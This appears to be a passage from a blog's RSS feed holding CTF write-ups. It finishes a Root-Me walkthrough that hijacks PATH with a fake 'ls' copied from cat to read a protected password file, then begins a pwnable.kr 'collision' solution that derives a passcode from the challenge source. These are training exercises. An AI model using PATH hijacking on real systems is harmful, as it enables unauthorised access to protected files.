&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok. This tells us the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command is being run under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; path. But what if we had another &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command referenced in our $PATH variable? If the order of our new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command path comes first then the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; path, then the system will prioritize that path instead.&lt;/p&gt;

&lt;p&gt;I doubt we have write permissions in any of these paths, so we might as well find a directory that we can write a maliciously crafted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command AND that this new path is added to our $PATH variable, listed before the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; path.&lt;/p&gt;

&lt;p&gt;An usual choice for that is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory, which usually gives write permissions to any user:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cecil-daemon
app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/cecil-daemon &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 0
drwxr-x---   2 app-script-ch11 app-script-ch11   40 Dec  5 01:17 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxrwx-wt 256 root            root            7220 Dec  5 01:17 ..
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We successfully created a directory inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; and, as we can see, we have write permissions on it. Now, we want to add this new directory to our path variable:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/cecil-daemon:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
/tmp/cecil-daemon:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Amazing! Our new directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil-daemon&lt;/code&gt; is now under the $PATH variable, and it is listed before &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt;. Now, we need to create a binary called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; that instead of having the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, it has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. Let’s try it out!&lt;/p&gt;

&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;We need to check where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command is being executed from. This can be achieved by running:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
/bin/cat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;My first attempt to craft a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; is by simply copying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; binary from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil-daemon&lt;/code&gt; under the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. This should force the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; to always run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command instead.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/cat ./ls 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As a test, we can run our malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; to read a file’s contents:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; test.txt
app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ls test.txt
&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It seems to be working! Now, let’s go back to our home directory and run the binary. If everything was done correctly, we will be able to see the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; - 
/challenge/app-script/ch11
app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch11
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;oPe96a/.s8d5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We did it! Enjoy the feeling of owning and tricking a system!&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we learned a bit more about system misconfigurations and misuse of C functions. We started by understanding the core concepts used by the challenge script, then we tackled the problem by understanding how we could exploit it.&lt;/p&gt;

&lt;p&gt;After grasping the nature of the CTF, we needed to create an attack vector. In our case, this was possible because we had write permissions in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and access to change the $PATH variable to our own gains. By combining these misconfigurations with a little out-of-the-box thinking, we crafted a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command that mimicked the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command - the one we wanted to use.&lt;/p&gt;

&lt;p&gt;It’s always good practice to understand what’s happening before jumping into testing. This approach makes things easier and often clarifies the solution.&lt;/p&gt;

&lt;p&gt;Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 04 Dec 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000//bash-system-1-root-me</link>
        <link href="http://localhost:4000/bash-system-1-root-me"/>
        <guid isPermaLink="true">http://localhost:4000/bash-system-1-root-me</guid>
      </item>
    
      <item>
        <title>collision - pwnable.kr</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Let’s continue with our card dropping adventures on &lt;a href=&quot;https://pwnable.kr&quot;&gt;Pwnable&lt;/a&gt;. This time, we will be dropping Fabre’s card. If you haven’t checked my first blog post solving ‘fd’ on Pwnable, go check it out &lt;a href=&quot;fd-pwnable&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Let’s start!&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!&lt;/p&gt;

  &lt;p&gt;ssh col@pwnable.kr -p2222 (pw:guest)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;Simarly to the last CTF challenge, we shall tackle this one by first understanding what is a &lt;em&gt;MD5 hash collision&lt;/em&gt; before we even ssh into the machine.&lt;/p&gt;

&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;

&lt;p&gt;MD5 hash collision is a well defined attack, with many different articles and papers explaining the concept. For instance, &lt;a href=&quot;https://scholarworks.sjsu.edu/cgi/viewcontent.cgi?referer=&amp;amp;httpsredir=1&amp;amp;article=1020&amp;amp;context=etd_projects&quot;&gt;D. Kashyap&lt;/a&gt; has a complete dedicated Master’s thesis on this, which might be more than enough for us to understand this attack.&lt;/p&gt;

&lt;p&gt;In it, we can see that the definition of a collision attack is: &lt;em&gt;“Finding two different messages that gives the same hash value”&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The idea is the following: in a collision attack, the goal is to find two distinct messages $M$ and $M’$ that produce the same hash value $h$. This can be conceptualized by modifying subcomponents of $M$ - say $M_0$ and $M_1$ - to create the new message $M’$ - composed of $M_0’$ and $M_1’$ - such that the hash of $M’$ equals the hash of $M$.&lt;/p&gt;

&lt;p&gt;The relations between the two subcomponents of $M$ and $M’$ are&lt;/p&gt;

\[M_0&apos; = M_0 + \Delta M_0\]

&lt;p&gt;and&lt;/p&gt;

\[M_1&apos; = M_1 + \Delta M_1\]

&lt;p&gt;where $\Delta M_0 = M_0’ - M_0$ and $\Delta M_1 = M_1’ - M_1$ are the bitwise difference of the two sub-message pairs. These two, $\Delta M_0$ and $\Delta M_1$, are typically complex to calculate, but if succeeded, they do compromise the integrity of systems using MD5 by allowing different inputs to be treated as identical.&lt;/p&gt;

&lt;p&gt;While I doubt these calculations are going to be related to this CTF’s, it is good practice to understand the broader concept of collisions, as it might help us solve the challange. If you are interested in reading more about the specifics of MD5 collision, check it out &lt;a href=&quot;https://scholarworks.sjsu.edu/cgi/viewcontent.cgi?referer=&amp;amp;httpsredir=1&amp;amp;article=1020&amp;amp;context=etd_projects&quot;&gt;D. Kashyap&lt;/a&gt; thesis.&lt;/p&gt;

&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;Alright, let’s ssh into the machine and take a look around! We can ssh with the command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh col@pwnable.kr -p2222&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Remember to pass the correct password, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt;. As soon as we land into the machine, we can run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l&lt;/code&gt; command. This gives us:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;col@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
total 16
&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt; 1 col_pwn col     7341 Jun 11  2014 col
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root    root     555 Jun 12  2014 col.c
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt; 1 col_pwn col_pwn   52 Jun 11  2014 flag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;col.c&lt;/code&gt; script:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;usage : %s [passcode]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;passcode length should be 20 bytes&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrong passcode.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmmm. Interesting. This looks like a simple password verification code, which we can use by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./col &amp;lt;passcode&amp;gt;&lt;/code&gt;. Let’s break it down:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;First, the code checks if our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; input has length 20. If not, then it warns us that it must have length 20.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;If our passcode has 20 bytes, then the code will pass it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_password&lt;/code&gt; function. If the output from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_password&lt;/code&gt; equals &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode = 0x21DD09EC&lt;/code&gt;, then we solve the challenge.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Let’s understand now what the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_password&lt;/code&gt; function does:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;First, it initializes an integer pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip&lt;/code&gt; that references each 4 bytes of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; as an integer.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;It then initializes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;res&lt;/code&gt; integer as 0, thus interpreting the input string as an array of integers. This means that each 4 bytes of the passcode are grouped together and interpreted as one integer.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Finally, it returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;res&lt;/code&gt; with the hexadecimal representation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; we provided.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Note that we need to pass a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; that is represented in its hexadecimal value as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode&lt;/code&gt;. This is where the collision happens! Note that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; must have 20 bytes in length. When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_password&lt;/code&gt; is called, it will break our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; into 5 different integer values that must add up to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode&lt;/code&gt;. That means the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; must add up to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x21DD09EC&lt;/code&gt; within 5 iterations. For that matter, we need to divide &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x21DD09EC&lt;/code&gt; by 5, and the result must be our 4 bytes sub-messages of our 20 bytes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can use &lt;a href=&quot;https://www.calculator.net/hex-calculator.html&quot;&gt;this&lt;/a&gt; hex calculator to properly find the division of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode&lt;/code&gt; by 5:&lt;/p&gt;

\[\frac{0\text{x21DD09EC}}{5} = 0\text{x6C5CEC8} \text{ remainder : 4}\]

&lt;p&gt;The division is not exact, which means we have a leftover term to be added in order to retrieve the exact value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode&lt;/code&gt;. This means that:&lt;/p&gt;

\[\text{remainder} = 0\text{x21DD09EC} - 4*0\text{x6C5CEC8}\]

&lt;p&gt;Which is the same as&lt;/p&gt;

\[\text{remainder} = 0\text{x21DD09EC} - 0\text{x1B173B20} = 0\text{x6C5CECC}\]

&lt;p&gt;So, if our calculations are correct, we have:&lt;/p&gt;

\[\text{hashcode} = 0\text{x21DD09EC} = 4*0\text{x6C5CEC8} + 0\text{x6C5CECC}\]

